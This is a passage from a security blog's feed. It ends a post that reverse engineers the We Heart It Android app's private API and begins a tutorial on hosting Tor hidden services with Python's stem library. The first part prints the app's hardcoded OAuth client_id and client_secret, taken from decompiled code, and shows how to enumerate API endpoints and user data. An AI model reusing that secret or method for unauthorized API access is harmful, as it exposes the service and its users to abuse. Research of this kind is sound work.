</span><span class='line'>    "hearts_count": 11285,
</span><span class='line'>    "created_at": "2013-11-10T17:09:49Z",
</span><span class='line'>    "hearted": false,
</span><span class='line'>    "via_hearts_count": 9919,
</span><span class='line'>    "tags": [&lt;snip&gt;],
</span><span class='line'>    "creator": {
</span><span class='line'>        "id": 6043210,
</span><span class='line'>        "username": "Natasja4205",
</span><span class='line'>        &lt;snip&gt;
</span><span class='line'>    },
</span><span class='line'>    "user": {
</span><span class='line'>        "id": 6043210,
</span><span class='line'>        "username": "Natasja4205",
</span><span class='line'>        &lt;snip&gt;
</span><span class='line'>    }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /api/v2/users/27215547 HTTP/1.1
</span><span class='line'>Host: api.weheartit.com
</span><span class='line'>Authorization: Bearer [redacted]
</span><span class='line'>
</span><span class='line'>{
</span><span class='line'>    "id": 27215547,
</span><span class='line'>    "username": "jordan_test2",
</span><span class='line'>    "name": "Jordan Test",
</span><span class='line'>    "avatar": [&lt;snip&gt;],
</span><span class='line'>    "public_account": true,
</span><span class='line'>    "verified": false,
</span><span class='line'>    "location": null,
</span><span class='line'>    "bio": null,
</span><span class='line'>    "link": null,
</span><span class='line'>    "hearts_count": 0,
</span><span class='line'>    "following_count": 1,
</span><span class='line'>    "followers_count": 2,
</span><span class='line'>    "sets_count": 0,
</span><span class='line'>    "created_at": "2014-10-12T18:38:35Z",
</span><span class='line'>    "cover": {&lt;snip&gt;}
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Great &ndash; we have an API! We could likely automate this app crawling to enumerate the available API calls and parameters. However, to get a more comprehensive idea as to what exact API endpoints are available, let&rsquo;s go straight to the source.</p>

<h3>Static Analysis</h3>

<p>Now that we have a feel of how the application operates, let&rsquo;s verify our findings by <a href="http://jordan-wright.github.io/blog/2014/08/10/decompiling-android-apps-the-easy-way/">decompiling the Android app</a> and doing some static analysis.</p>

<h4>App Structure</h4>

<p>The app has quite a few dependencies, but the core package (<code>com.weheartit</code>) is fairly straight-forward. The API we are concerned with is located at <code>com.weheartit.api</code>. Searching for the string &ldquo;/api&rdquo;, we can find that the bulk of the API functionality is found in APIRequest.java and APIRequestv2.java</p>

<h4>APIRequest.java</h4>

<p>APIRequest.java essentially contains the schema for version 1 of the OAuth enabled RESTful API. For example, we can find the OAuth <code>client_id</code> and <code>client_secret</code> parameters used by the Android app to get an access token:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">Map</span> <span class="n">map</span><span class="o">,</span> <span class="n">LoginServices</span> <span class="n">loginservices</span><span class="o">,</span> <span class="n">ApiResponseCallback</span> <span class="n">apiresponsecallback</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;client_id&quot;</span><span class="o">,</span> <span class="s">&quot;25ieooqr&quot;</span><span class="o">);</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;client_secret&quot;</span><span class="o">,</span> <span class="s">&quot;zlype4airg41b33uwafbe8a6p8bwcgiw&quot;</span><span class="o">);</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;grant_type&quot;</span><span class="o">,</span> <span class="s">&quot;password&quot;</span><span class="o">);</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">putAll</span><span class="o">(</span><span class="n">map</span><span class="o">);</span>
</span><span class='line'>        <span class="n">a</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="s">&quot;oauth/token&quot;</span><span class="o">,</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">OAuthDataResponseHandler</span><span class="o">(</span><span class="n">apiresponsecallback</span><span class="o">,</span> <span class="n">LoginServices</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">loginservices</span><span class="o">)));</span>
</span><span class='line'>    <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This function is used to obtain an access token using the appropriate LoginServices call. After we have an access token associated with a <code>User</code> object, this access token is used in subsequent API requests. We can enumerate through the functions in APIRequest.java to find each of the valid API calls, as well as the arguments to each call. Here are a couple of examples (more comprehensive documentation below):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">UserSettings</span> <span class="n">usersettings</span><span class="o">,</span> <span class="n">ApiResponseCallback</span> <span class="n">apiresponsecallback</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="n">User</span> <span class="n">user</span> <span class="o">=</span> <span class="n">WhiSession</span><span class="o">.</span><span class="na">b</span><span class="o">();</span>
</span><span class='line'>        <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="na">getAccessToken</span><span class="o">();</span>
</span><span class='line'>        <span class="n">WhiLog</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">&quot;ApiRequest&quot;</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;updateUserSettings() for user (&quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getId</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;)&quot;</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">(</span><span class="mi">12</span><span class="o">);</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;access_token&quot;</span><span class="o">,</span> <span class="n">s</span><span class="o">);</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[name]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getFullName</span><span class="o">());</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[username]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[email]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getEmail</span><span class="o">());</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[bio]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getBio</span><span class="o">());</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[location]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getLocation</span><span class="o">());</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[link]&quot;</span><span class="o">,</span> <span class="n">usersettings</span><span class="o">.</span><span class="na">getLink</span><span class="o">());</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;user[show_unsafe_content]&quot;</span><span class="o">,</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">usersettings</span><span class="o">.</span><span class="na">isUnsafeContentEnabled</span><span class="o">()));</span>
</span><span class='line'>        <span class="o">&lt;</span><span class="nl">snip:</span> <span class="n">other</span> <span class="n">settings</span><span class="o">&gt;</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;privacy_options[public]&quot;</span><span class="o">,</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">usersettings</span><span class="o">.</span><span class="na">isUserPublic</span><span class="o">()));</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;privacy_options[findable]&quot;</span><span class="o">,</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">usersettings</span><span class="o">.</span><span class="na">isUserFindable</span><span class="o">()));</span>
</span><span class='line'>        <span class="n">a</span><span class="o">.</span><span class="na">c</span><span class="o">(</span><span class="s">&quot;api/settings&quot;</span><span class="o">,</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">ApiOperationResponseHandler</span><span class="o">(</span><span class="n">apiresponsecallback</span><span class="o">,</span> <span class="s">&quot;Failed to update user settings&quot;</span><span class="o">));</span>
</span><span class='line'>    <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="kt">long</span> <span class="n">l</span><span class="o">,</span> <span class="n">Long</span> <span class="n">long1</span><span class="o">,</span> <span class="n">ApiResponseCallback</span> <span class="n">apiresponsecallback</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="n">Object</span> <span class="n">aobj</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">3</span><span class="o">];</span>
</span><span class='line'>        <span class="n">aobj</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">s</span><span class="o">;</span>
</span><span class='line'>        <span class="n">aobj</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="n">Long</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">l</span><span class="o">);</span>
</span><span class='line'>        <span class="n">aobj</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">=</span> <span class="n">long1</span><span class="o">;</span>
</span><span class='line'>        <span class="n">WhiLog</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">&quot;ApiRequest&quot;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&quot;getEntryCollectionDetails() with %s, %s, %s&quot;</span><span class="o">,</span> <span class="n">aobj</span><span class="o">));</span>
</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;access_token&quot;</span><span class="o">,</span> <span class="n">s</span><span class="o">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">long1</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
</span><span class='line'>        <span class="o">{</span>
</span><span class='line'>            <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;heart_id&quot;</span><span class="o">,</span> <span class="n">long1</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>        <span class="n">a</span><span class="o">.</span><span class="na">a</span><span class="o">((</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;api/entry_sets/&quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">l</span><span class="o">).</span><span class="na">toString</span><span class="o">(),</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">EntryListResponseHandler</span><span class="o">(</span><span class="n">apiresponsecallback</span><span class="o">,</span> <span class="n">c</span><span class="o">));</span>
</span><span class='line'>    <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>APIRequestv2.java</h4>

<p>It appears as though the backend API is being upgraded to a new version, as evidenced by the existence of APIRequestv2.java. Additionally, there are some endpoints that are located at <code>/api/v2/*</code>. Here are a couple of examples:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="kt">long</span> <span class="n">l</span><span class="o">,</span> <span class="kt">int</span> <span class="n">i</span><span class="o">,</span> <span class="n">ApiResponseCallback</span> <span class="n">apiresponsecallback</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="n">WhiLog</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">&quot;ApiRequestV2&quot;</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;getUserEntryCollections() with accessToken &quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;, &quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">l</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;, &quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">i</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;access_token&quot;</span><span class="o">,</span> <span class="n">s</span><span class="o">);</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;page&quot;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">i</span><span class="o">));</span>
</span><span class='line'>        <span class="n">e</span><span class="o">.</span><span class="na">a</span><span class="o">((</span><span class="k">new</span> <span class="n">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;api/v2/users/&quot;</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">l</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&quot;/collections&quot;</span><span class="o">).</span><span class="na">toString</span><span class="o">(),</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">EntryCollectionListV2ResponseHandler</span><span class="o">(</span><span class="n">apiresponsecallback</span><span class="o">,</span> <span class="n">a</span><span class="o">));</span>
</span><span class='line'>    <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">,</span> <span class="n">Long</span> <span class="n">long1</span><span class="o">,</span> <span class="n">ApiPagedResponseCallback</span> <span class="n">apipagedresponsecallback</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="n">WhiLog</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">&quot;ApiRequestV2&quot;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&quot;getUserDashboard() with %s, %d&quot;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">s</span><span class="o">,</span> <span class="n">long1</span>
</span><span class='line'>        <span class="o">}));</span>
</span><span class='line'>        <span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
</span><span class='line'>        <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;access_token&quot;</span><span class="o">,</span> <span class="n">s</span><span class="o">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">long1</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
</span><span class='line'>        <span class="o">{</span>
</span><span class='line'>            <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;before&quot;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">long1</span><span class="o">));</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>        <span class="n">e</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">&quot;api/v2/user/dashboard&quot;</span><span class="o">,</span> <span class="n">hashmap</span><span class="o">,</span> <span class="k">new</span> <span class="n">UserDashboardResponseHandler</span><span class="o">(</span><span class="n">apipagedresponsecallback</span><span class="o">,</span> <span class="n">b</span><span class="o">));</span>
</span><span class='line'>    <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>API Documentation</h3>

<p>I have created a repository, <a href="http://github.com/jordan-wright/weheartit-api">weheartit-api</a>, containing the full details found from this short study. The information in the repo is by no means comprehensive (consider it a work in progress), but it will hopefully shed some light into the available API functionality.</p>

<h3>WHI Sitemaps</h3>

<p>While on the subject of WHI, there are a couple of other interesting facts worth mentioning. For example, if your goal is to get general information about users on the network, there is no need to use the API! In fact, to help Google crawl the network, WHI publishes the following information in its <code>sitemaps</code> files:</p>

<ul>
<li>Username</li>
<li>Link to Profile</li>
<li>Date Modified</li>
<li>List of Collections</li>
</ul>


<p>You can find these files here:</p>

<ul>
<li><a href="http://sitemaps.weheartit.com/collections.xml">http://sitemaps.weheartit.com/collections.xml</a></li>
<li><a href="http://sitemaps.weheartit.com/entry_groups.xml">http://sitemaps.weheartit.com/entry_groups.xml</a></li>
<li><a href="http://sitemaps.weheartit.com/entries.xml">http://sitemaps.weheartit.com/entries.xml</a></li>
<li><a href="http://sitemaps.weheartit.com/popular_images.xml">http://sitemaps.weheartit.com/popular_images.xml</a></li>
<li><a href="http://sitemaps.weheartit.com/users.xml">http://sitemaps.weheartit.com/users.xml</a></li>
<li><a href="http://sitemaps.weheartit.com/tags.xml">http://sitemaps.weheartit.com/tags.xml</a></li>
</ul>


<h3>Conclusion</h3>

<p>For not being exposed to developers, the API supported by WHI is surprisingly robust and complete. While this effort was simply a reverse engineering project out of curiosity, I hope that showing what the API is capable of will encourage WHI devs to open the official API to everyone.</p>

<p>As always, let me know if you have any questions or comments!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Creating Tor Hidden Services with Python]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/10/06/creating-tor-hidden-services-with-python/"/>
    <updated>2014-10-06T20:00:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/10/06/creating-tor-hidden-services-with-python</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/hidden_services.png"/></p>

<h3>Introduction</h3>

<p>Tor is often used to protect the anonymity of someone who is trying to connect to a service. However, it is also possible to use Tor to protect the anonymity of a service provider via <a href="https://www.torproject.org/docs/hidden-services.html.en"><strong><em>hidden services</em></strong></a>. These services, operating under the <code>.onion</code> TLD, allow publishers to anonymously create and host content viewable only by other Tor users.</p>

<p>The Tor project has <a href="https://www.torproject.org/docs/tor-hidden-service.html.en">instructions</a> on how to create hidden services, but this can be a manual and arduous process if you want to setup multiple services. This post will show how we can use the fantastic <code>stem</code> Python library to automatically create and host a Tor hidden service.</p>

<!--more-->


<h3>Creating Hidden Services Manually</h3>

<p>The <a href="https://www.torproject.org/docs/tor-hidden-service.html.en#two">instructions provided by the Tor project</a> show that creating hidden services simply involves setting up the service locally (such as a web server listening on localhost), and then setting a few configuration options to make the service available via Tor.</p>

<p>There are two configuration settings necessary to setup a hidden service: <code>HiddenServiceDir</code>, the directory to store the <code>hostname</code> and <code>private_key</code> files, and <code>HiddenServicePort</code>, the ports used to proxy hidden service connections.</p>

<p>As the instructions show, each hidden service requires a variation of the following two lines to be present in the <code>torrc</code> configuration file (setting the directory, host, and ports appropriately):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HiddenServiceDir /path/to/store/hidden_service/
</span><span class='line'>HiddenServicePort 80 127.0.0.1:5000</span></code></pre></td></tr></table></div></figure>


<h3>A Bit About the Tor Control Protocol</h3>

<p>Changing the configuration file and restarting Tor everytime a change is needed can be a pain. Fortunately, Tor provides a way to dynamically change the running configuration using a simple text based protocol (similar to Telnet) called the Tor Control Protocol.</p>

<p>The <a href="https://gitweb.torproject.org/torspec.git?a=blob_plain;hb=HEAD;f=control-spec.txt">full specification</a> of the protocol is available, however here is a quick example of getting the valid authentication methods:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ telnet localhost 9151
</span><span class='line'>PROTOCOLINFO
</span><span class='line'>
</span><span class='line'>250-PROTOCOLINFO 1
</span><span class='line'>250-AUTH METHODS=COOKIE,SAFECOOKIE,HASHEDPASSWORD COOKIEFILE="Tor\\control_auth_cookie"
</span><span class='line'>250-VERSION Tor="0.2.4.24"
</span><span class='line'>250 OK</span></code></pre></td></tr></table></div></figure>


<p>Other examples using this extensive protocol can be found <a href="https://www.thesprawl.org/research/tor-control-protocol/">here</a> or in the full protocol spec.</p>

<h3>Introducing Stem</h3>

<p>To make interacting with the Tor control port both easier and programmatic, the Tor project maintains a fantastic Python library called <a href="https://stem.torproject.org/">Stem</a>.</p>

<h4><code>stem.Controller</code></h4>

<p>Interaction with the Tor control port is performed using the <code>stem.Controller</code> class. Creating an instance of the class involves connecting to the port and authenticating as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from stem.control import Controller
</span><span class='line'>controller = Controller.from_port(address="127.0.0.1", port=9151)
</span><span class='line'>try:
</span><span class='line'>    controller.authenticate(password="")
</span><span class='line'>except Exception as e:
</span><span class='line'>    print e</span></code></pre></td></tr></table></div></figure>


<p>Now that we have a Controller, we can access the local configuration, pull the current descriptors for relays, and more.</p>

<p>Let&rsquo;s use the Controller to automatically set the configuration settings we saw in the previous section. When set, these configuration options will cause Tor to create the two files, <code>hostname</code> and <code>private_key</code>, necessary to run the hidden service. Here is a short script that will setup a hidden service to listen on TCP port 80 and proxy all requests to an (already established) web server listening on <a href="http://127.0.0.1:5000:">http://127.0.0.1:5000:</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>host = "127.0.0.1"
</span><span class='line'>port = 5000
</span><span class='line'>hidden_svc_dir = "/tmp/hidden_service/"
</span><span class='line'>controller.set_options([
</span><span class='line'>    ("HiddenServiceDir", hidden_svc_dir),
</span><span class='line'>    ("HiddenServicePort", "80 %s:%s" % (host, str(port)))
</span><span class='line'>])
</span><span class='line'>svc_name = open(hidden_svc_dir + "/hostname", "r").read().strip()
</span><span class='line'>print "Created host: %s" % svc_name</span></code></pre></td></tr></table></div></figure>


<p>Easy as that! Now that we have the configuration setup, our service should be ready to go.</p>

<h3>An Example Service</h3>

<p>Now that we&rsquo;ve seen a little about how Stem works, here&rsquo;s an extremely basic example showing how the hidden service can be setup to work with a Flask application:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from stem.control import Controller
</span><span class='line'>from flask import Flask
</span><span class='line'>
</span><span class='line'>if __name__ == "__main__":
</span><span class='line'>
</span><span class='line'>    app = Flask("example")
</span><span class='line'>    port = 5000
</span><span class='line'>    host = "127.0.0.1"
</span><span class='line'>    hidden_svc_dir = "c:/temp/"
</span><span class='line'>
</span><span class='line'>    @app.route('/')
</span><span class='line'>    def index():
</span><span class='line'>        return "&lt;h1&gt;Tor works!&lt;/h1&gt;"
</span><span class='line'>    print " * Getting controller"
</span><span class='line'>    controller = Controller.from_port(address="127.0.0.1", port=9151)
</span><span class='line'>    try:
</span><span class='line'>        controller.authenticate(password="")
</span><span class='line'>        controller.set_options([
</span><span class='line'>            ("HiddenServiceDir", hidden_svc_dir),
</span><span class='line'>            ("HiddenServicePort", "80 %s:%s" % (host, str(port)))
</span><span class='line'>            ])
</span><span class='line'>        svc_name = open(hidden_svc_dir + "/hostname", "r").read().strip()
</span><span class='line'>        print " * Created host: %s" % svc_name
</span><span class='line'>    except Exception as e:
</span><span class='line'>        print e
</span><span class='line'>    app.run()</span></code></pre></td></tr></table></div></figure>


<p>Here&rsquo;s what this looks like in action:</p>

